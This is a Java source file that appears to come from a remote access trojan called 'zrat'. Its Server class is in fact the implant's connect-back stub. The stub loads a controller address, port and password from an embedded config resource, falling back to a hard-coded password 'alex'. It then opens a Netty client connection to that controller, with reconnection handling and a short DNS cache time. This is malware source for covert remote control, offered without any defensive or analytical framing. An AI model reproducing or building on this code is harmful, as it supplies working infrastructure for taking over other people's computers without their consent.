package com.zrat.server;

import java.io.IOException;
import java.io.InputStream;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.UnknownHostException;
import java.util.Properties;
import java.util.concurrent.Executors;

import org.jboss.netty.bootstrap.ClientBootstrap;
import org.jboss.netty.channel.Channel;
import org.jboss.netty.channel.socket.DatagramChannel;
import org.jboss.netty.channel.socket.nio.NioClientSocketChannelFactory;
import org.jboss.netty.util.HashedWheelTimer;
import org.jboss.netty.util.Timer;

import com.zrat.server.nio.factory.ServerPipelineFactory;

public class Server {

	public static  String PASSWORD = "alex";
	public static  String HOST = "127.0.0.1";
	public static  int PORT = 9889;
	private static Channel channel;
	public static String currentFile;
	
	private static DatagramChannel udpChannel;
	
	public static void main(String[] args) throws IOException, InterruptedException {
		new Server().start();
	}
	
	public  static Channel getChannel(){
		return channel;
	}
	
	public  static void setChannel(Channel channel){
		Server.channel = channel;
	}

	public void start() {
		// Initialize the timer that schedules subsequent reconnection attempts.
		final Timer timer = new HashedWheelTimer();
		java.security.Security.setProperty("networkaddress.cache.ttl", "5");
		InputStream is = this.getClass().getResourceAsStream("config.cfg");

		
		Properties p = new Properties();
		
		try {
			p.load(is);
	        is.close();
	        if (p.get("address")!=null)
	        	HOST = p.get("address").toString();
	        if(p.get("port") !=null){
	        	PORT =  Integer.valueOf(p.get("port").toString());
	        }
	        if (p.get("password") != null){
	        	PASSWORD = p.get("password").toString();
	        }
		} catch (Exception e1) {
		}
		// Configure the client.
		final ClientBootstrap bootstrap = new ClientBootstrap(
				new NioClientSocketChannelFactory(Executors
						.newCachedThreadPool(), Executors.newCachedThreadPool()));
		bootstrap
				.setPipelineFactory(new ServerPipelineFactory(bootstrap, timer));

		bootstrap.setOption("receiveBufferSize", 409600);
		bootstrap.setOption("sendBufferSize", 409600);
		try {
			bootstrap.setOption("remoteAddress", new InetSocketAddress(InetAddress.getByName(HOST).getHostAddress(),PORT));
		} catch (UnknownHostException e) {
			// TODO Auto-generated catch block
		}

		bootstrap.connect();
	}

	public static DatagramChannel getUdpChannel() {
		return udpChannel;
	}

	public static void setUdpChannel(DatagramChannel udpChannel) {
		Server.udpChannel = udpChannel;
	}
	
}
